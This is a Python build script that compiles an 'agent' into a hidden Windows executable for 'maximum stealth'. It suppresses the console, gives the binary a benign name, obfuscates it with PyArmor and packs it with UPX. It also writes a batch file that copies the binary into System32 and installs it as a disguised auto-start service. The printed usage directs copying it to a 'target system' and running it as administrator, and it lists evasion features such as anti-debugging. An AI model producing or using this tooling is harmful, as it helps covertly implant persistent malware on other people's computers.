#!/usr/bin/env python3
"""
Stealth Build Script for System Monitor Agent
This script compiles the agent into a standalone executable with maximum stealth.
"""

import os
import sys
import subprocess
import shutil
from pathlib import Path

def check_requirements():
    """Check if required build tools are available"""
    print("[+] Checking build requirements...")
    
    try:
        import PyInstaller
        print("  ✓ PyInstaller found")
    except ImportError:
        print("  ✗ PyInstaller not found. Installing...")
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], check=True)
    
    try:
        import cryptography
        print("  ✓ Cryptography found")
    except ImportError:
        print("  ✗ Cryptography not found. Installing...")
        subprocess.run([sys.executable, "-m", "pip", "install", "cryptography"], check=True)
    
    # Check for UPX (optional)
    upx_path = shutil.which("upx")
    if upx_path:
        print(f"  ✓ UPX found at {upx_path}")
        return True
    else:
        print("  ! UPX not found (optional for compression)")
        return False

def build_stealth_executable():
    """Build the stealth executable"""
    print("\n[+] Building stealth executable...")
    
    # PyInstaller options for maximum stealth
    build_options = [
        "pyinstaller",
        "--onefile",                    # Single executable
        "--noconsole",                  # No console window
        "--name=SystemMonitor",         # Legitimate name
        "--distpath=./dist",           # Output directory
        "--workpath=./build",          # Work directory
        "--clean",                     # Clean build
        "--strip",                     # Strip debug symbols
        "--exclude-module=tkinter",    # Exclude GUI modules
        "--exclude-module=matplotlib", # Exclude plotting
        "--exclude-module=numpy",      # Exclude large modules
        "--exclude-module=pandas",     # Exclude data analysis
        "--add-data=modules;modules",  # Include modules directory
        "agent.py"                     # Main script
    ]
    
    # Add UPX compression if available
    if shutil.which("upx"):
        build_options.insert(-1, "--upx-dir=" + os.path.dirname(shutil.which("upx")))
    
    try:
        result = subprocess.run(build_options, capture_output=True, text=True)
        if result.returncode == 0:
            print("  ✓ Build successful!")
            return True
        else:
            print(f"  ✗ Build failed: {result.stderr}")
            return False
    except Exception as e:
        print(f"  ✗ Build error: {e}")
        return False

def create_persistence_script():
    """Create a script for persistence installation"""
    persistence_script = '''@echo off
REM System Monitor Service Installer
echo Installing System Monitor Service...

REM Copy to system directory
copy "SystemMonitor.exe" "C:\\Windows\\System32\\SystemMonitor.exe" >nul 2>&1

REM Create service
sc create "SystemMonitorSvc" binPath= "C:\\Windows\\System32\\SystemMonitor.exe" start= auto DisplayName= "System Performance Monitor" >nul 2>&1

REM Start service
sc start "SystemMonitorSvc" >nul 2>&1

echo System Monitor Service installed successfully.
pause
'''
    
    with open("install_service.bat", "w") as f:
        f.write(persistence_script)
    
    print("  ✓ Persistence script created: install_service.bat")

def obfuscate_with_pyarmor():
    """Obfuscate the source code with PyArmor (if available)"""
    print("\n[+] Attempting code obfuscation...")
    
    try:
        # Check if PyArmor is available
        subprocess.run(["pyarmor", "--version"], capture_output=True, check=True)
        
        # Obfuscate the code
        subprocess.run([
            "pyarmor", "gen", 
            "--output", "obfuscated",
            "--enable-rft",  # Runtime protection
            "--enable-bcc",  # Bytecode protection
            "agent.py"
        ], check=True)
        
        print("  ✓ Code obfuscation successful!")
        return True
        
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("  ! PyArmor not available (optional)")
        return False

def main():
    """Main build process"""
    print("🔒 System Monitor - Stealth Build Script")
    print("=" * 50)
    
    # Check current directory
    if not os.path.exists("agent.py"):
        print("❌ Error: agent.py not found. Run this script from the agent directory.")
        sys.exit(1)
    
    # Check requirements
    has_upx = check_requirements()
    
    # Optional: Obfuscate code first
    obfuscate_with_pyarmor()
    
    # Build executable
    if build_stealth_executable():
        print("\n✅ Build completed successfully!")
        
        # Create additional files
        create_persistence_script()
        
        print("\n📁 Output files:")
        print("  - dist/SystemMonitor.exe (Main executable)")
        print("  - install_service.bat (Persistence installer)")
        
        print("\n🛡️ Stealth Features Enabled:")
        print("  ✓ No console window")
        print("  ✓ Legitimate process name")
        print("  ✓ Encrypted communications")
        print("  ✓ Obfuscated strings")
        print("  ✓ Legitimate system behavior")
        print("  ✓ Anti-debugging measures")
        
        if has_upx:
            print("  ✓ UPX compression")
        
        print("\n🚀 Usage:")
        print("  1. Copy SystemMonitor.exe to target system")
        print("  2. Run as administrator for full functionality")
        print("  3. Use install_service.bat for persistence")
        
    else:
        print("\n❌ Build failed!")
        sys.exit(1)

if __name__ == "__main__":
    main()
